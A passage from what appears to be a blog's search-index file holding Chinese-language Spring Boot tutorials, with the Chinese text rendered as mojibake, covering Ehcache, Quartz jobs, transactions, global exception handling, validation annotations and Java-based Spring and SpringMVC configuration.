class="line">  <span class="attr">cache:</span></span><br><span class="line">    <span class="attr">ehcache:</span></span><br><span class="line">      <span class="attr">config:</span> <span class="string">classpath:ehcache.xml</span></span><br></pre></td></tr></table></figure><p>å¯åŠ¨ç±»å¯ç”¨ç¼“å­˜ï¼Œæ·»åŠ <code>@EnableCaching</code>æ³¨è§£</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@EnableCaching</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Starter</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        SpringApplication.run(Starter.class, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ­¤å¤–ï¼Œbeanå¯¹è±¡å‡éœ€å®ç°åºåˆ—åŒ–æ¥å£ç”¨äºå­˜å‚¨å¯¹è±¡</p><br/><h2 id="å®šæ—¶è°ƒåº¦Quartzé›†æˆ"><a href="#å®šæ—¶è°ƒåº¦Quartzé›†æˆ" class="headerlink" title="å®šæ—¶è°ƒåº¦Quartzé›†æˆ"></a>å®šæ—¶è°ƒåº¦Quartzé›†æˆ</h2><p>é…ç½®ä¾èµ–é¡¹</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Quartz --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-quartz<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å®šä¹‰å®šæ—¶ä»»åŠ¡ç±»ï¼Œå®ç°<code>Job</code>æ¥å£ï¼Œåœ¨<code>execute()</code>æ–¹æ³•ä¸­å®ç°ä»»åŠ¡é€»è¾‘</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyFirstJob</span> <span class="keyword">implements</span> <span class="title class_">Job</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">Logger</span> <span class="variable">log</span> <span class="operator">=</span> LoggerFactory.getLogger(MyFirstJob.class);</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">execute</span><span class="params">(JobExecutionContext context)</span> <span class="keyword">throws</span> JobExecutionException &#123;</span><br><span class="line">        <span class="type">SimpleDateFormat</span> <span class="variable">sdf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleDateFormat</span>(<span class="string">&quot;yyyy-MM-dd HH:mm:ss&quot;</span>);</span><br><span class="line">        log.info(sdf.format(<span class="keyword">new</span> <span class="title class_">Date</span>()) + <span class="string">&quot;--&gt;&quot;</span> + <span class="string">&quot;Hello Spring Boot Quartz...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ›å»ºé…ç½®ç±»ï¼Œå®ä¾‹åŒ–<code>JobDetail</code>å¹¶å®šä¹‰<code>Trigger</code>æ³¨å†Œåˆ°<code>scheduler</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">QuartzConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> JobDetail <span class="title function_">jobDetail1</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> JobBuilder.newJob(MyFirstJob.class).storeDurably().build();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> Trigger <span class="title function_">trigger1</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">SimpleScheduleBuilder</span> <span class="variable">scheduleBuilder</span> <span class="operator">=</span> SimpleScheduleBuilder.simpleSchedule()</span><br><span class="line">                .withIntervalInSeconds(<span class="number">1</span>)</span><br><span class="line">                .repeatForever();</span><br><span class="line">        <span class="keyword">return</span> TriggerBuilder.newTrigger()</span><br><span class="line">                .withIdentity(<span class="string">&quot;trigger1&quot;</span>, <span class="string">&quot;group1&quot;</span>)</span><br><span class="line">                .withSchedule(scheduleBuilder)</span><br><span class="line">                .forJob(jobDetail1())</span><br><span class="line">                .build();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br/><h2 id="äº‹åŠ¡æ§åˆ¶ä¸å…¨å±€å¼‚å¸¸"><a href="#äº‹åŠ¡æ§åˆ¶ä¸å…¨å±€å¼‚å¸¸" class="headerlink" title="äº‹åŠ¡æ§åˆ¶ä¸å…¨å±€å¼‚å¸¸"></a>äº‹åŠ¡æ§åˆ¶ä¸å…¨å±€å¼‚å¸¸</h2><h3 id="äº‹åŠ¡æ§åˆ¶"><a href="#äº‹åŠ¡æ§åˆ¶" class="headerlink" title="äº‹åŠ¡æ§åˆ¶"></a>äº‹åŠ¡æ§åˆ¶</h3><p>ä½¿ç”¨<code>@Transactional</code>æ³¨è§£è¿›è¡Œäº‹åŠ¡æ§åˆ¶ï¼Œåœ¨é‡åˆ°å¼‚å¸¸æ—¶è¿›è¡Œå›æ»šï¼Œç¡®ä¿æ•°æ®åŒæ­¥</p><h3 id="å…¨å±€å¼‚å¸¸"><a href="#å…¨å±€å¼‚å¸¸" class="headerlink" title="å…¨å±€å¼‚å¸¸"></a>å…¨å±€å¼‚å¸¸</h3><p>SpringMVC ä¸­å¯¹å¼‚å¸¸ç»Ÿä¸€å¤„ç†æä¾›äº†ç›¸åº”çš„æ–¹å¼ï¼Œæ¨èä½¿ç”¨å®ç° <code>HandlerExceptionResolver</code> æ¥å£çš„æ–¹å¼ï¼Œå¯¹ä»£ç ä¾µå…¥æ€§è¾ƒå°</p><p><strong><code>@ControllerAdvice</code>æ³¨è§£</strong></p><p>è¯¥æ³¨è§£ç»„åˆäº† <code>@Component</code> æ³¨è§£åŠŸèƒ½ï¼Œæœ€å¸¸ç”¨çš„å°±æ˜¯ä½œä¸ºå…¨å±€å¼‚å¸¸å¤„ç†çš„åˆ‡é¢ç±»ã€‚åŒæ—¶é€šè¿‡è¯¥æ³¨è§£å¯ä»¥æŒ‡å®šåŒ…æ‰«æçš„èŒƒå›´ã€‚<code>@ControllerAdvice</code> çº¦å®šäº†å‡ ç§å¯è¡Œçš„è¿”å›å€¼ï¼Œå¦‚æœæ˜¯ç›´æ¥è¿”å› model ç±»çš„è¯ï¼Œéœ€è¦ä½¿ç”¨ <code>@ResponseBody</code> è¿›è¡Œ JSON è½¬æ¢</p><p><strong><code>@ExceptionHandler</code>æ³¨è§£</strong></p><p>è¯¥æ³¨è§£åœ¨ Spring 3.X ç‰ˆæœ¬å¼•å…¥ï¼Œåœ¨å¤„ç†å¼‚å¸¸æ—¶æ ‡æ³¨åœ¨æ–¹æ³•çº§åˆ«ï¼Œä»£è¡¨å½“å‰æ–¹æ³•å¤„ç†çš„å¼‚å¸¸ç±»å‹æœ‰å“ªäº›ã€‚å…·ä½“åº”ç”¨ä»¥ Restful æ¥å£ä¸ºä¾‹ï¼Œæµ‹è¯•ä¿å­˜ç”¨æˆ·æ¥å£</p><p><strong>å®šä¹‰å…¨å±€å¼‚å¸¸å¤„ç†ç±»</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@ControllerAdvice</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GlobalExceptionHandler</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@ExceptionHandler(value = Exception.class)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> ResultInfo <span class="title function_">exceptionHandler</span><span class="params">(Exception e)</span> &#123;</span><br><span class="line">        <span class="type">ResultInfo</span> <span class="variable">resultInfo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResultInfo</span>();</span><br><span class="line">        resultInfo.setCode(<span class="number">300</span>);</span><br><span class="line">        resultInfo.setMsg(<span class="string">&quot;æ“ä½œå¤±è´¥!&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(e <span class="keyword">instanceof</span> ParamsException) &#123;</span><br><span class="line">            <span class="type">ParamsException</span> <span class="variable">pe</span> <span class="operator">=</span> (ParamsException) e;</span><br><span class="line">            resultInfo.setMsg(pe.getMsg());</span><br><span class="line">            resultInfo.setCode(pe.getCode());</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> resultInfo;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br/><h2 id="æ•°æ®æ ¡éªŒValidationé›†æˆ"><a href="#æ•°æ®æ ¡éªŒValidationé›†æˆ" class="headerlink" title="æ•°æ®æ ¡éªŒValidationé›†æˆ"></a>æ•°æ®æ ¡éªŒValidationé›†æˆ</h2><p>åœ¨æ—¥å¸¸é¡¹ç›®å¼€å‘ä¸­ï¼Œå¯¹äºå‰ç«¯æäº¤çš„è¡¨å•ï¼Œåå°æ¥å£æ¥æ”¶åˆ°è¡¨å•æ•°æ®åï¼Œä¸ºäº†ç¨‹åºçš„ä¸¥è°¨æ€§ï¼Œé€šå¸¸åç«¯ä¼šåŠ å…¥ä¸šåŠ¡å‚æ•°çš„åˆæ³•æ ¡éªŒæ“ä½œæ¥é¿å…ç¨‹åºçš„éæŠ€æœ¯æ€§ bugã€‚è¿™é‡Œå¯¹äºå®¢æˆ·ç«¯æäº¤çš„æ•°æ®æ ¡éªŒï¼ŒSpring Boot é€šè¿‡ <code>spring-boot-starter-validation</code> æ¨¡å—åŒ…å«äº†æ•°æ®æ ¡éªŒçš„å·¥ä½œ</p><p><strong>JSR303</strong>ï¼šJSR303 æ˜¯ä¸€é¡¹æ ‡å‡†ï¼Œåªæä¾›è§„èŒƒä¸æä¾›å®ç°ï¼Œè§„å®šä¸€äº›æ ¡éªŒè§„èŒƒå³æ ¡éªŒæ³¨è§£ï¼Œå¦‚ <code>@Null</code>ã€<code>@NotNull</code>ã€<code>@Pattern</code>ï¼Œä½äº <code>javax.validation.constraints</code> åŒ…ä¸‹ã€‚JSR-349 æ˜¯å…¶å‡çº§ç‰ˆæœ¬ï¼Œæ·»åŠ äº†ä¸€äº›æ–°ç‰¹æ€§</p><p><strong>Hibernate Validation</strong>ï¼šHibernate Validation æ˜¯å¯¹è¿™ä¸ªè§„èŒƒçš„å®ç°ï¼Œå¹¶å¢åŠ äº†ä¸€äº›å…¶ä»–æ ¡éªŒæ³¨è§£ï¼Œå¦‚ <code>@Email</code>ã€<code>@Length</code>ã€<code>@Range</code> ç­‰ç­‰</p><p><strong>Spring Validation</strong>ï¼šSpring Validation å¯¹ Hibernate Validation è¿›è¡Œäº†äºŒæ¬¡å°è£…ï¼Œåœ¨ Spring MVC æ¨¡å—ä¸­æ·»åŠ äº†è‡ªåŠ¨æ ¡éªŒï¼Œå¹¶å°†æ ¡éªŒä¿¡æ¯å°è£…è¿›äº†ç‰¹å®šçš„ç±»ä¸­</p><h3 id="ç›¸å…³æ³¨è§£-1"><a href="#ç›¸å…³æ³¨è§£-1" class="headerlink" title="ç›¸å…³æ³¨è§£"></a>ç›¸å…³æ³¨è§£</h3><table><thead><tr><th align="left">æ³¨è§£</th><th align="left">åŠŸèƒ½æè¿°</th></tr></thead><tbody><tr><td align="left"><strong>@AssertFalse</strong></td><td align="left">å¯ä»¥ä¸º nullï¼Œå¦‚æœä¸ä¸º null åˆ™å¿…é¡»ä¸º false</td></tr><tr><td align="left"><strong>@AssertTrue</strong></td><td align="left">å¯ä»¥ä¸º nullï¼Œå¦‚æœä¸ä¸º null åˆ™å¿…é¡»ä¸º true</td></tr><tr><td align="left"><strong>@DecimalMax</strong></td><td align="left">è®¾ç½®ä¸èƒ½è¶…è¿‡çš„æœ€å¤§å€¼</td></tr><tr><td align="left"><strong>@DecimalMin</strong></td><td align="left">è®¾ç½®ä¸èƒ½å°äºçš„æœ€å°å€¼</td></tr><tr><td align="left"><strong>@Digits</strong></td><td align="left">å¿…é¡»æ˜¯æ•°å­—ï¼Œä¸”æ•´æ•°éƒ¨åˆ†å’Œå°æ•°éƒ¨åˆ†çš„ä½æ•°åœ¨æŒ‡å®šèŒƒå›´å†…</td></tr><tr><td align="left"><strong>@Future</strong></td><td align="left">æ—¥æœŸå¿…é¡»åœ¨å½“å‰æ—¥æœŸçš„æœªæ¥</td></tr><tr><td align="left"><strong>@Past</strong></td><td align="left">æ—¥æœŸå¿…é¡»åœ¨å½“å‰æ—¥æœŸçš„è¿‡å»</td></tr><tr><td align="left"><strong>@Max</strong></td><td align="left">å€¼ä¸å¾—è¶…è¿‡æŒ‡å®šçš„æœ€å¤§å€¼</td></tr><tr><td align="left"><strong>@Min</strong></td><td align="left">å€¼ä¸å¾—å°äºæŒ‡å®šçš„æœ€å°å€¼</td></tr><tr><td align="left"><strong>@NotNull</strong></td><td align="left">ä¸èƒ½ä¸º nullï¼ˆä½†å¯ä»¥æ˜¯ç©ºå­—ç¬¦ä¸²ã€ç©ºé›†åˆç­‰ï¼‰</td></tr><tr><td align="left"><strong>@Pattern</strong></td><td align="left">å¿…é¡»æ»¡è¶³æŒ‡å®šçš„æ­£åˆ™è¡¨è¾¾å¼</td></tr><tr><td align="left"><strong>@Size</strong></td><td align="left">é›†åˆã€æ•°ç»„ã€Map ç­‰çš„ size() å€¼å¿…é¡»åœ¨æŒ‡å®šèŒƒå›´å†…</td></tr><tr><td align="left"><strong>@Email</strong></td><td align="left">å¿…é¡»æ˜¯åˆæ³•çš„ç”µå­é‚®ä»¶æ ¼å¼</td></tr><tr><td align="left"><strong>@Length</strong></td><td align="left">å­—ç¬¦ä¸²é•¿åº¦å¿…é¡»åœ¨æŒ‡å®šèŒƒå›´å†…</td></tr><tr><td align="left"><strong>@NotBlank</strong></td><td align="left">å­—ç¬¦ä¸²ä¸èƒ½ä¸º nullï¼Œä¸” trim() åä¸èƒ½ç­‰äºç©ºå­—ç¬¦ä¸²</td></tr><tr><td align="left"><strong>@NotEmpty</strong></td><td align="left">ä¸èƒ½ä¸º nullï¼Œé›†åˆã€æ•°ç»„ã€Map ç­‰ size() ä¸èƒ½ä¸º 0ï¼›å­—ç¬¦ä¸² trim() åå¯ä»¥ç­‰äºç©ºå­—ç¬¦ä¸²</td></tr><tr><td align="left"><strong>@Range</strong></td><td align="left">å€¼å¿…é¡»åœ¨æŒ‡å®šçš„èŒƒå›´å†…</td></tr><tr><td align="left"><strong>@URL</strong></td><td align="left">å¿…é¡»æ˜¯ä¸€ä¸ªåˆæ³•çš„ URL</td></tr></tbody></table><p>å¯¹å­—æ®µå±æ€§å€¼è¿›è¡Œæ ¡éªŒ</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Integer id;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@NotBlank(message = &quot;ç”¨æˆ·åä¸èƒ½ä¸ºç©º!&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String userName;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@NotBlank(message = &quot;ç”¨æˆ·å¯†ç ä¸èƒ½ä¸ºç©º!&quot;)</span></span><br><span class="line">    <span class="meta">@Length(min = 6, max = 10, message = &quot;å¯†ç é•¿åº¦è‡³å°‘6ä½ä½†ä¸è¶…è¿‡10ä½!&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String userPwd;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Email</span></span><br><span class="line">    <span class="keyword">private</span> String email;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯¹æ¥å£æ–¹æ³•çš„å½¢å‚è¿›è¡Œæ ¡éªŒ</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@PostMapping(&quot;user&quot;)</span></span><br><span class="line"><span class="meta">@ApiOperation(value = &quot;ç”¨æˆ·æ·»åŠ &quot;)</span></span><br><span class="line"><span class="meta">@ApiImplicitParam(name = &quot;user&quot;, value = &quot;ç”¨æˆ·å®ä½“ç±»&quot;, dataType = &quot;User&quot;)</span></span><br><span class="line"><span class="keyword">public</span> ResultInfo <span class="title function_">saveUser</span><span class="params">(<span class="meta">@Valid</span> User user)</span> &#123;</span><br><span class="line">    <span class="type">ResultInfo</span> <span class="variable">resultInfo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResultInfo</span>();</span><br><span class="line">    <span class="keyword">return</span> resultInfo;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸æ»¡è¶³æ•°æ®æ ¡éªŒçš„æƒ…å†µä¼šæŠ›å‡º<code>Bind Exception</code>å¼‚å¸¸ï¼Œå¯ä»¥ç»“åˆå…¨å±€å¼‚å¸¸å¯¹å…¶è¿›è¡Œå¤„ç†</p><br/>]]></content>
      
      
      <categories>
          
          <category> ç®€æ˜“å¼€å‘ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SpringBootç¬¬ä¸€éƒ¨åˆ†</title>
      <link href="/2025/12/31/SpringBoot%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86/"/>
      <url>/2025/12/31/SpringBoot%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86/</url>
      
        <content type="html"><![CDATA[<h1 id="SpringBootç¬¬ä¸€éƒ¨åˆ†"><a href="#SpringBootç¬¬ä¸€éƒ¨åˆ†" class="headerlink" title="SpringBootç¬¬ä¸€éƒ¨åˆ†"></a>SpringBootç¬¬ä¸€éƒ¨åˆ†</h1><p>Spring Boot æ˜¯ä¸€ä¸ªåŸºäº Spring æ¡†æ¶çš„å¼€ç®±å³ç”¨é¡¹ç›®ï¼Œé€šè¿‡è‡ªåŠ¨é…ç½®å’Œçº¦å®šä¼˜äºé…ç½®çš„åŸåˆ™æå¤§ç®€åŒ–äº†é¡¹ç›®çš„åˆå§‹æ­å»ºä¸å¼€å‘éƒ¨ç½²æµç¨‹ã€‚å®ƒå†…ç½®äº† Tomcatã€Jetty ç­‰ Web æœåŠ¡å™¨ï¼Œå¯ç›´æ¥æ‰“åŒ…ä¸ºå¯ç‹¬ç«‹è¿è¡Œçš„ JAR æ–‡ä»¶ï¼Œæ— éœ€ä¾èµ–å¤–éƒ¨å®¹å™¨</p><br/><h2 id="æ³¨è§£é…ç½®"><a href="#æ³¨è§£é…ç½®" class="headerlink" title="æ³¨è§£é…ç½®"></a>æ³¨è§£é…ç½®</h2><p>ä»¥ä¸‹æ³¨è§£å¯ç”¨äºé…ç½®å’Œè·å–beanï¼Œç”¨ä»¥å–ä»£XMLé…ç½®æ–‡ä»¶</p><table><thead><tr><th align="left">æ³¨è§£</th><th align="left">ä½œç”¨ä½ç½®</th><th align="left">åŠŸèƒ½æè¿°</th></tr></thead><tbody><tr><td align="left"><code>@Configuration</code></td><td align="left">ç±»</td><td align="left">å£°æ˜å½“å‰ç±»ä¸ºé…ç½®ç±»ï¼Œç›¸å½“äº XML é…ç½®æ–‡ä»¶</td></tr><tr><td align="left"><code>@ComponentScan</code></td><td align="left">ç±»</td><td align="left">è‡ªåŠ¨æ‰«ææŒ‡å®šåŒ…ä¸‹å¸¦æœ‰ <code>@Repository</code>ã€<code>@Service</code>ã€<code>@Controller</code>ã€<code>@Component</code> çš„ç±»ï¼Œå¹¶ç”± IoC å®¹å™¨è¿›è¡Œå®ä¾‹åŒ–å’Œç»´æŠ¤</td></tr><tr><td align="left"><code>@Component</code></td><td align="left">ç±»</td><td align="left">é€šç”¨æ³¨è§£ï¼Œå£°æ˜è¯¥ç±»ä¸º Spring ç»„ä»¶ï¼Œç”± IoC å®¹å™¨ç®¡ç†</td></tr><tr><td align="left"><code>@Bean</code></td><td align="left">æ–¹æ³•</td><td align="left">å£°æ˜å½“å‰æ–¹æ³•çš„è¿”å›å€¼ä¸ºä¸€ä¸ª Beanï¼Œç›¸å½“äº XML ä¸­çš„ <code>&lt;bean&gt;</code> æ ‡ç­¾</td></tr><tr><td align="left"><code>@Value</code></td><td align="left">å­—æ®µã€æ–¹æ³•å‚æ•°</td><td align="left">ç”¨äºä» properties æ–‡ä»¶ä¸­è·å–æŒ‡å®š key å¯¹åº”çš„ value å€¼</td></tr></tbody></table><h3 id="Beanæ³¨è§£ä½¿ç”¨"><a href="#Beanæ³¨è§£ä½¿ç”¨" class="headerlink" title="@Beanæ³¨è§£ä½¿ç”¨"></a><code>@Bean</code>æ³¨è§£ä½¿ç”¨</h3><p>åœ¨é…ç½®ç±»ä¸­å®ä¾‹åŒ–</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@ComponentScan(&quot;com.example.springboot&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IocConfig</span> &#123;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> AccountDao <span class="title function_">accountDao</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">AccountDao</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è·å–å®ä¾‹</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Starter02</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">AnnotationConfigApplicationContext</span> <span class="variable">ac</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AnnotationConfigApplicationContext</span>(IocConfig.class);</span><br><span class="line">        <span class="type">IocConfig</span> <span class="variable">iocConfig</span> <span class="operator">=</span> ac.getBean(IocConfig.class);</span><br><span class="line">        <span class="type">AccountDao</span> <span class="variable">accountDao</span> <span class="operator">=</span> iocConfig.accountDao();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Valueæ³¨è§£ä½¿ç”¨"><a href="#Valueæ³¨è§£ä½¿ç”¨" class="headerlink" title="@Valueæ³¨è§£ä½¿ç”¨"></a><code>@Value</code>æ³¨è§£ä½¿ç”¨</h3><p>å‡†å¤‡é…ç½®æ–‡ä»¶ï¼Œå¦‚<code>user.properties</code></p><figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="attr">user.userName</span> = <span class="string">admin</span></span><br><span class="line"><span class="attr">user.</span> <span class="string">userPasswd = admin</span></span><br></pre></td></tr></table></figure><p>é…ç½®ç±»é€šè¿‡<code>@PropertySource</code>æ³¨è§£åŠ è½½é…ç½®æ–‡ä»¶ï¼Œ<code>@Value</code>ç”¨äºè·å–å€¼</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@ComponentScan(&quot;com.example.springboot&quot;)</span></span><br><span class="line"><span class="meta">@PropertySource(value = &quot;classpath:user.properties&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IocConfig</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;user.userPasswd&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String adminPasswd;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨é…ç½®ç±»ä¸­åŠ è½½åï¼Œå…¶ä»–beanå¯¹è±¡éƒ½å¯ä»¥è·å¾—è½½å…¥çš„é…ç½®æ–‡ä»¶å±æ€§</p><h3 id="å…ƒæ³¨è§£ä¸ç»„åˆæ³¨è§£"><a href="#å…ƒæ³¨è§£ä¸ç»„åˆæ³¨è§£" class="headerlink" title="å…ƒæ³¨è§£ä¸ç»„åˆæ³¨è§£"></a>å…ƒæ³¨è§£ä¸ç»„åˆæ³¨è§£</h3><p>å…ƒæ³¨è§£å¯ä»¥æ ‡è®°åœ¨æ³¨è§£ä¸Šç»„æˆç»„åˆæ³¨è§£ï¼Œç»„åˆæ³¨è§£å…·æœ‰å…ƒæ³¨è§£çš„åŸå§‹åŠŸèƒ½ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥è‡ªå®šä¹‰ç»„åˆæ³¨è§£ã€‚è‡ªå®šä¹‰çš„ç»„åˆæ³¨è§£ä¸€èˆ¬å…·æœ‰<code>@Target</code>ã€<code>@Retention</code>ã€<code>@Documented</code>ä¸‰ä¸ªå…ƒæ³¨è§£ï¼Œåˆ†åˆ«è¡¨ç¤ºè¯¥æ³¨è§£ä½œç”¨çš„å¯¹è±¡ã€ä¿ç•™æ—¶æœºå’Œæ³¨è§£ä¿¡æ¯æ˜¯å¦å­˜åœ¨äºJavaDocä¸­</p><p>è‡ªå®šä¹‰ç»„åˆæ³¨è§£</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Retention(RetentionPolicy.RUNTIME)</span></span><br><span class="line"><span class="meta">@Target(ElementType.TYPE)</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@ComponentScan</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> NewCompScan &#123;</span><br><span class="line">    String[] value() <span class="keyword">default</span> &#123;&#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br/><h2 id="SpringMVCçš„æ³¨è§£é…ç½®"><a href="#SpringMVCçš„æ³¨è§£é…ç½®" class="headerlink" title="SpringMVCçš„æ³¨è§£é…ç½®"></a>SpringMVCçš„æ³¨è§£é…ç½®</h2><p> ç¼–å†™é…ç½®ç±»å–ä»£XMLé…ç½®æ–‡ä»¶</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="comment">// åœ¨@Configurationæ³¨è§£çš„é…ç½®ç±»ä¸­æ·»åŠ ï¼Œç”¨äºä¸ºè¯¥åº”ç”¨æ·»åŠ SpringMVCçš„åŠŸèƒ½</span></span><br><span class="line"><span class="meta">@EnableWebMvc</span></span><br><span class="line"><span class="meta">@ComponentScan(&quot;com.xxxx.springboot&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MVCConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> InternalResourceViewResolver <span class="title function_">viewResolver</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">InternalResourceViewResolver</span> <span class="variable">viewResolver</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InternalResourceViewResolver</span>();</span><br><span class="line">        viewResolver.setPrefix(<span class="string">&quot;/WEB-INF/views/&quot;</span>);</span><br><span class="line">        viewResolver.setSuffix(<span class="string">&quot;.jsp&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> viewResolver;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨<code>WebApplicationInitializer</code>æ¥å£çš„å®ç°ç±»å®ç°é…ç½®ç±»çš„åŠŸèƒ½ï¼Œå®ç°è¯¥æ¥å£çš„ç±»éƒ½èƒ½åœ¨webåº”ç”¨å¯åŠ¨æ—¶è¢«åŠ è½½</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WebInitializer</span> <span class="keyword">implements</span> <span class="title class_">WebApplicationInitializer</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onStartup</span><span class="params">(ServletContext servletContext)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">        <span class="type">AnnotationConfigWebApplicationContext</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AnnotationConfigWebApplicationContext</span>();</span><br><span class="line">        ctx.register(MVCConfig.class);</span><br><span class="line">        ctx.setServletContext(servletContext);</span><br><span class="line">        ServletRegistration.<span class="type">Dynamic</span> <span class="variable">servlet</span> <span class="operator">=</span> servletContext.addServlet(<span class="string">&quot;dispatcher&quot;</span>, <span class="keyword">new</span> <span class="title class_">DispatcherServlet</span>(ctx));</span><br><span class="line">        servlet.addMapping(<span class="string">&quot;/&quot;</span>);</span><br><span class="line">        servlet.setLoadOnStartup(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…³äºé…ç½®æ‹¦æˆªå™¨ï¼Œéœ€è¦<code>MVCConfig</code>é…ç½®ç±»å®ç° 